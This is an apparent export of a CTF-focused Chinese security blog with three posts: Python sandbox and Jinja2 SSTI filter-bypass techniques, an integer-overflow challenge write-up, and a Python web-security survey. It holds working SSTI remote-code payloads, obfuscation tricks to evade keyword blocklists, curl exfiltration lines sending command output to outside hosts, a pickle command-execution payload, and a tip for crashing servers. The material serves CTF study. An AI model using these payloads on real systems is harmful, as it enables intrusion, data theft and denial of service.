{"meta":{"title":"evoA's Blog","subtitle":"Ctfer","description":"CTF WEB狗","author":"evoA","url":"http://evoa.me"},"pages":[],"posts":[{"title":"Python沙盒及SSTI 绕过","slug":"2018-11-20-Python沙盒及SSTI绕过","date":"2018-11-20T11:57:10.000Z","updated":"2018-11-20T12:05:39.863Z","comments":true,"path":"2018/11/20/2018-11-20-Python沙盒及SSTI绕过/","link":"","permalink":"http://evoa.me/2018/11/20/2018-11-20-Python沙盒及SSTI绕过/","excerpt":"","text":"护网杯ltshop引发的思考前言最近比赛打的太菜了，没什么好写的，而且先知和安全客的师傅写的太全了 贴一下前几天例会分享的沙盒及SSTI绕过 也是很基础的内容，DL 轻喷 orz SSTI形式贴出我自己SSTI中常用的py2 EXP,下面就用这个做比喻，可能还有更精简的exp，知道的师傅勿喷，求评论告知 1().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\") 面对现在CTF的出题人，想直接用这种exp 99.99%是不可能的，更何况拿shell简单的话会有一堆搅屎棍，所以出题人会用各种奇形怪状的过滤姿势阻止你直接使用，这时候就需要用一些奇技淫巧绕过这些恶心的过滤 姿势1123456import reuser_input_for_web = input() #伪代码if re.findall(r'(import)|(system)|(eval)|(builtins)|(os)',user_input_for_web) != []: exit 这种黑名单过滤了一些关键字，但是根据上面的exp，可以发现这些关键字都是在字符串中，所以我们可以使用编码字符串来绕过，例如 电脑和你很轻松就能分辨这串是恶意代码 1__import__('os').system('whoami') 那如果是这个呢 1'5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729' 于是我们可以使用 1eval('5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729'.decode('hex')) 来绕过黑名单过滤，我称之为字符串混淆 于是可以发现，只要是在字符串中的，都可以使用这种方式进行绕过 除了这个之外，还有很多字符串混淆的方式 12345678910111213141516'12345' == '123''45''12345' == ''.join(('1','2','3','4','5'))'12345' == ''.join((chr(49),chr(50),chr(51),chr(52),chr(53)))'12345' == 'MTIzNDU='.decode('base64')'12345' == b'\\x31\\x32\\x33\\x34\\x35'.decode('utf8')'12345' == '54321'[::-1] 欢迎师傅们补充 姿势2123456import reuser_input_for_web = input() #伪代码if re.findall(r'(__class__)|(__init__)|(__globals__)|(__base__)',user_input_for_web) != []: exit 还是拿我的exp举例，可以很清楚的发现，这次waf把我们的非字符串部分给过滤了，于是乎我们的姿势1完全失效 1().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\") 这时要祭出一个函数getattr() 众所周知，python面向对象做的非常完善，万物皆对象，而访问对象内的属性和方法，一般都是使用 . 来访问， 而getattr函数就是一种替代 . 来访问对象内属性和方法的函数，并且它在内置函数中，不需要引入任何包，由于他的第二个参数（被访问的属性名或方法名）为字符串形式，相当于().__class__变成了getattr((),’__class__‘)形式 惊喜发现，我们可以成功的方法属性转换成字符串形式，结合姿势1 1234().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")getattr(getattr(getattr(getattr(getattr((),'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['__builtins__']['eval'](\"__import__('os').system('whoami')\") 里面的字符串随意替换混淆，别说waf了，人都看不出来这是啥 姿势3123456import reuser_input_for_web = input() #伪代码if re.findall(r'(\\[)|(\\])',user_input_for_web) != []: exit 上面的不管是哪个exp，我们都用到了[] 但如果waf过滤[]怎么办 比如a = [0,1,2,3,4,5] 如何不用[]取a的第3个元素? 方法1：a[2]== a.pop(2) pop函数会将一个列表中的一个元素弹出并返回，但是不建议使用，因为如函数描述，只能用一次，用第二次元素就已经不存在或者变成另一个元素了。 方法2：a[2]== a.__getitem__(2) 还是内置的函数方法，知道了就行了，推荐使用，记得可以跟姿势1,2结合 姿势4:如果，如果，连引号都被过滤了怎么办 123456import reuser_input_for_web = input() #伪代码if re.findall(r'(\\')|(\\'])|(\")',user_input_for_web) != []: exit 天无绝人之路 其实姿势1里面有个方式已经提示了 1'12345' == chr(49)+chr(50)+chr(51)+chr(52)+chr(53) 捕获一只没有引号的字符串 #其实我之前还想到了一个方法，不过忘了记下来，等以后想到了在放上来，求师傅们告知 姿势5：如果，都被过滤了呢？ 123456import reuser_input_for_web = input() #伪代码if re.findall(r'(&#123;&#123;)|(&#125;&#125;)',user_input_for_web) != []: exit 也就是没有回显而已嘛，可以用盲注的思想带外或反弹shell 1234&#123;% if ().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('curl http://127.0.0.1:1234?`cat flag`')\") %&#125;1&#123;% endif %&#125; 然后在放一下带外的exp(markdown有时自动把引号转成中文的，师傅们记得注意符号避免踩坑) 1234#linux下的pocos.system('$a=`ifconfig` || curl –data \"$a\" http://xxx.xxx.xxx.xxx:xxxx')os.system(curl https://xxx.xxx.xxx.xxx/? `cat flag.txt`) 123#windows下的pocos.system('powershell $a=ipconfig; curl http://xxx.xxx.xxx.xxx:xxxx -Body $a -Method post') 杂最后放一些再别的地方可能用得到的沙盒绕过tip execfile()加载执行一个Py文件，并把里面的方法全部加载到当前上下文中 1execfile('./os.py') == from os.py import * reload()Python中能直接引用的函数都是__builtin__中 123del __builtins__.__import__reload(__builtins__) dir()获得当前模块下的属性方法等 list()元祖变列表","categories":[{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/tags/CTF/"}]},{"title":"护网杯ltshop引发的思考","slug":"2018-10-14-护网杯ltshop引发的思考","date":"2018-10-14T05:21:14.000Z","updated":"2018-10-14T20:12:07.693Z","comments":true,"path":"2018/10/14/2018-10-14-护网杯ltshop引发的思考/","link":"","permalink":"http://evoa.me/2018/10/14/2018-10-14-护网杯ltshop引发的思考/","excerpt":"","text":"护网杯ltshop引发的思考前言质量还是比较高的一个比赛，Web有点偏，不过对大家来说很公平，除了一些神仙队，如此题开局6小时无一人做出，一血后一个多小时就60多个队了，神仙神仙，打不过。本来有机会进线下的，奈何1000分的理论题忘了做了。。。。小伤 题目描述题目开始需要注册账号，登陆进去后是一个商场，每个账号初始有20RMB，5RMB可以买1包大辣条，5包大辣条换1包辣条之王，9999999包辣条之王可以换Flag 做题思路全页面就一个输入点，选择你需要越换辣条之王的数量，发现我们的钱连一个辣条之王都买不了，联想到之前CTFtime上的某个比赛（忘了），第一步条件竞争，Burp200线程买大辣条，成功买到16包大辣条！！！，但是因为要9999999包辣条之王才能换flag 思路1:查看此题有没有换回去的方法，如果存在可以通过条件竞争一直来回换辣条和RMB，导致RMB或辣条越来越多从而买到Flag，遗憾的是并没有反向兑换 思路2:查看是否可以通过注册账号功能或者其他功能，让每个账号的资产全部移植到同一个账号上去。Burp抓全部包，一一查看，发现逻辑全部在后台处理，除了cookie没有任何输入点，放弃 思路3:可以通过php弱类型类似于0.999999=1的方法，发现小数点被过滤，放弃 然后我就被卡在这了，常规思路走不通，走不常规思路，首先Fuzz输入框，发现除了数字几乎全部被过滤，但是；(分号)并没有被过滤，但也没有利用的方法，扫目录扫文件泄露没有任何发现，cookie发现后台是用golang写的，百度一波golang的漏洞，看了一波文章没有任何发现。。。 然后后面几乎一直都在人肉Fuzz了，啥字符啥payload都输了一遍，没有任何反应，然后突然刘师傅说了一句会不会是数值溢出因为go是强类型。发现新大陆，查看go数据类型最大值准备fuzz poc。 但打到比赛结束都没有做出来，赛后看wp发现要除以5才能拿，之前Web没做过溢出的题目，研究了一会儿，大概推测后台代码大致如下(不会Go用伪代码代替一下) 1234567891011121314151617181920#伪代码uint64 number = input() //用户输入的兑换辣条之王的数字uint64 max = math.uint64max //无符号整型的最大值uint64 biglt = 16 //用户的大辣条包数，如上假如为16包uint64 kinglt = 0 //用户拥有的辣条之王if(number不是数字)&#123; error&#125;else if(number &gt; max)&#123; error&#125;else if( (biglt - 5 * number) &lt; 0 )&#123; print 买不起那么多&#125;else if( (biglt - 5 * number) &gt;= 0 )&#123; print 购买成功 biglt = biglt - 5 * number kinglt = number&#125; Go的64位无符号整型最大值为18446744073709551615（简称max） 对于无符号整型的溢出，我们知道 max + 1 = 0 max + 2 = 1 max + n = n -1 max * 2 = max - 1 max * 3 = max - 2 max * n = max - n 此时我们需要绕过判断让我们购买超多的辣条之王，所以上诉代码 biglt - 5 * number必须大于0 此时5 * number必须小于16 如上公示得知直接输入max是行不通的（比赛时候疯狂输入max,max-1,max+1……)，我们需要变换一下思路，比如(max + 1) / 5, (max + 2) / 5, (max + 3) / 5…… 只要max+n是5的倍数就行，我们选用(max+5) / 5, 此时biglt - 5 * number,等价于16 - max+5 等价于 16 - 4 等价于12，绕过了之前的所有判断，kinglt被赋值为(max+5)/5,大于9999999，我们成功买到了flag 后记没做出来有点可惜，本来其实可以想到的，但由于最后做出来的人太多了:) 可能有点慌一直在Fuzz了，没有想到去猜后台代码。归根结底还是自己太菜了，膜师傅们","categories":[{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/tags/CTF/"}]},{"title":"Python web安全(持续更新)","slug":"2018-10-03-Python-web安全(持续更新)-post","date":"2018-10-02T16:00:00.000Z","updated":"2018-10-14T17:14:51.074Z","comments":true,"path":"2018/10/03/2018-10-03-Python-web安全(持续更新)-post/","link":"","permalink":"http://evoa.me/2018/10/03/2018-10-03-Python-web安全(持续更新)-post/","excerpt":"","text":"SSTI in jinja2注入发生的原因：​ 由于不规范的代码习惯，参数格式化进字符串中在渲染模板，导致数据与逻辑混淆产生代码注入 解决办法​ 将数据和模板文件一同渲染 示例12345678910111213#app.pyfrom flask import Flask,render_template,request,render_template_stringapp = Flask(__name__)@app.route('/&lt;name&gt;')def security(name): page = '''&lt;h1&gt;This is Test page&lt;/h1&gt; &lt;h2&gt;Input: &#123;&#125;&lt;/h2&gt;'''.format(name) return render_template_string(page)if __name__ == '__main__': app.run(debug=True,host='0.0.0.0') 利用读取敏感信息我们必须通过一些全局变量来读取我们所需要的配置文件，flask内部存在request，config等全局变量 request request.environ 请求上下文信息 request.environ[‘werkzeug.server.shutdown’]() 关闭运行服务器 config 所有的配置值 数据库连接字符串，第三方服务凭据，SECRET_KEY等 config.items() 查看配置 config.root_path 查看文件所在的绝对路径 config.from_object config.from_pyfile config.from_envvar 对于reuqest全局变量，代表的是我们当前的请求及其上下文(服务器环境)，request对象中存在一个environ字典对象，里面包含了请求的上下文信息，该字典当中有一个shutdown_server的方法，相应的key值werkzeug.server.shutdown，执行此方法可以杀死服务器进程，虽然比较鸡肋，但线下赛可能有用 而对于config对象，其中储存了flask服务端的所有配置值, 除了配置值外，config中还存在几个方法，我们重点先谈config.from_object方法，下面贴出源码 1234567891011121314151617181920212223242526272829303132#!python def from_object(self, obj): \"\"\"Updates the values from the given object. An object can be of one of the following two types: - a string: in this case the object with that name will be imported - an actual object reference: that object is used directly Objects are usually either modules or classes. Just the uppercase variables in that object are stored in the config. Example usage:: app.config.from_object('yourapplication.default_config') from yourapplication import default_config app.config.from_object(default_config) You should not use this function to load the actual configuration but rather configuration defaults. The actual config should be loaded with :meth:`from_pyfile` and ideally from a location not within the package because the package might be installed system wide. :param obj: an import name or object \"\"\" if isinstance(obj, string_types): obj = import_string(obj) for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) def __repr__(self): return '&lt;%s %s&gt;' % (self.__class__.__name__, dict.__repr__(self)) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!pythondef import_string(import_name, silent=False): \"\"\"Imports an object based on a string. This is useful if you want to use import paths as endpoints or something similar. An import path can be specified either in dotted notation (``xml.sax.saxutils.escape``) or with a colon as object delimiter (``xml.sax.saxutils:escape``). If `silent` is True the return value will be `None` if the import fails. :param import_name: the dotted name for the object to import. :param silent: if set to `True` import errors are ignored and `None` is returned instead. :return: imported object \"\"\" # force the import name to automatically convert to strings # __import__ is not able to handle unicode strings in the fromlist # if the module is a package import_name = str(import_name).replace(':', '.') try: try: __import__(import_name) except ImportError: if '.' not in import_name: raise else: return sys.modules[import_name] module_name, obj_name = import_name.rsplit('.', 1) try: module = __import__(module_name, None, None, [obj_name]) except ImportError: # support importing modules not yet set up by the parent module # (or package for that matter) module = import_string(module_name) try: return getattr(module, obj_name) except AttributeError as e: raise ImportError(e) except ImportError as e: if not silent: reraise( ImportStringError, ImportStringError(import_name, e), sys.exc_info()[2]) 代码的大概意思是，当config.from_object传入一个字符串时，python会载入这个字符串对应的模块将所有大写的属性全部加入当前应用实例中。 SSTI in Jinja2执行任意代码当程序源码中未引入注册os等敏感包时，jinja无法调用os模块的相关函数，为了执行任意代码，这里联想到CTF比赛中经常出现的沙盒绕过， __bases__ 返回一个类直接所继承的类（元组形式） __class__ 返回一个实例所属的类 _globals__ 使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典。 __subclasses__() 获取一个类的子类，返回的是一个列表 __builtin__&amp;&amp; __builtins__ python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况 123#python2&gt;&gt;&gt; __builtins__&lt;module &apos;__builtin__&apos; (built-in)&gt; python3 poc ().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;) python2 poc ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;) Tips : 用以上Poc执行多次reboot shutdown su等命令，可以导致服务器机器卡死（宕机），线下赛Tip 还有不知道为啥通过@app.route(‘/ssti/&lt;name>‘) 这样引入的参数不能输入/ (斜杠)否则404，困惑，用request.argv.get获得就没关系，导致我一直没办法闭合&lt;/script>标签 接下来就是自己的理解了，但是发现在jinja2中使用os.system执行没有回显 可以用os.popen().read()读取 如果有字数限制，可以使用带外注入至文件，或者模板注入下python3下open()个文件就是用不了，这个以后再管，一直报类型错误 还有一种URL的带外注入，把命令返回值付给变量然后在请求带返回值参数的url吧,命令用反引号包裹赋给变量才会付给其返回值 linux下的poc os.system(‘$a=`ifconfig` || curl –data “$a” http://xxx.xxx.xxx.xxx:xxxx&#39;) 或 os.system(curl https://crowdshield.com/?\\`cat flag.txt`) windows下的poc os.system(‘powershell $a=ipconfig; curl http://xxx.xxx.xxx.xxx:xxxx -Body $a -Method post’) 可删去http://反序列化执行任意代码Python的反序列话与php不同，Python可以反序列化任意对象（既没有加载到代码中的OS等对象），而php反序列化只能加载已经存在的对象。这导致了Python反序列化可以执行任意代码。 pickle 基础指令 c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。 (：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。 t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。 S：读取引号中的字符串直到换行符处，然后将它压入堆栈。 R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。 .：结束pickle。 Eg: 123456789import osimport picklea = '''cossystem(S'ipconfig'tR.'''pickle.loads(a) 造成命令执行 除此之外还有PyYAML存在反序列漏洞（未了解） 格式化字符串漏洞由于python format格式化的功能，导致可以通过格式化字符串获取一些敏感数据，利用比较苛刻，且Django下可以读一些敏感数据。其他框架下十分难以利用 123456\"&#123;username&#125;\".format(username='phithon') # 普通用法\"&#123;username!r&#125;\".format(username='phithon') # 等同于 repr(username)\"&#123;number:0.2f&#125;\".format(number=0.5678) # 等同于 \"%0.2f\" % 0.5678，保留两位小数\"int: &#123;0:d&#125;; hex: &#123;0:#x&#125;; oct: &#123;0:#o&#125;; bin: &#123;0:#b&#125;\".format(42) # 转换进制\"&#123;user.username&#125;\".format(user=request.username) # 获取对象属性\"&#123;arr[2]&#125;\".format(arr=[0,1,2,3,4]) # 获取数组键值 Eg： 12345678910111213141516171819#用户实例类class admin(): name = 'admin' password = 'cmhwyx'class test(): name = 'test' password = 'test123'#用户类 class users(): name = 'users' user1 = admin() user2 = test()@app.route('/')def string(): user = admin() name1 = '&lt;h1&gt;&#123;user.user2.name&#125;&lt;/h1&gt;'+request.args.get('poc') #此处传入了一个参数 return Response(name1.format(user=users)) #格式化一个字符串 此时如果我们输入 http://domain.org/?poc={user.user1.password}即可以读到admin的密码 并且还可以通过python继承链找到一些更敏感的数据，暂时还找不到造成RCE，但Django框架可以通过继承链读取一些敏感数据 》参考P神的 Python 格式化字符串漏洞（Django为例） SQL注入通过框架自带的是不会造成sql注入的,如下： Person.objects.filter(first_name=request.GET.get(&#39;user&#39;)) 等 但如果使用原生Sql语句依旧可以造成注入 Person.objects.raw(&#39;select * from users &#39;) 或 123456import sqlite3conn = sqlite3.connect('test.db')curs = conn.cursor()curs.execute('SELECT `id`,`username`,`password` FROM `users`' where id = 变量) Python命令执行函数123456789101112131415161718192021eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen Python沙箱逃逸的n种姿势 用python继承链搞事情 利用Python pickle实现任意代码执行 Python 格式化字符串漏洞（Django为例） Python反序列化漏洞的花式利用","categories":[{"name":"web安全","slug":"web安全","permalink":"http://evoa.me/categories/web安全/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"python","slug":"python","permalink":"http://evoa.me/tags/python/"}]}]}